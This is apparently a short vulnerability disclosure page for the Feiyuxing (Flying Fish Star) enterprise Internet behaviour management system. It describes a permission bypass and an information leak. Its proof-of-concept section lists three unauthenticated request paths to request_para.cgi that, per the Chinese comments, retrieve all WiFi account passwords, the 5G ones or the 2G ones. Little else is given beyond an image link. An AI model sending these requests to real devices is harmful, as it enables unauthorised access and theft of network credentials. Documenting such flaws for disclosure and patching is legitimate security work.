# Feiyuxing Enterprise-level intelligent Internet behavior management system Permission bypass information leakage vulnerabilities

## Vulnerability Description

Feiyuxing Enterprise-level intelligent Internet behavior management system There are permission bypasses and information leakage vulnerabilities, and you can obtain administrator permissions and user passwords.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Flying Fish Star Enterprise-level intelligent Internet behavior management system</span>

## Network surveying and mapping



## Vulnerability reappears

Information leakage POC

```plain
/request_para.cgi?parameter=wifi_info 		 #获取ALL WIFI账号密码
/request_para.cgi?parameter=wifi_get_5g_host #获取5GWIFI账号密码
/request_para.cgi?parameter=wifi_get_2g_host #获取2GWIFI账号密码
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/fy-4.png)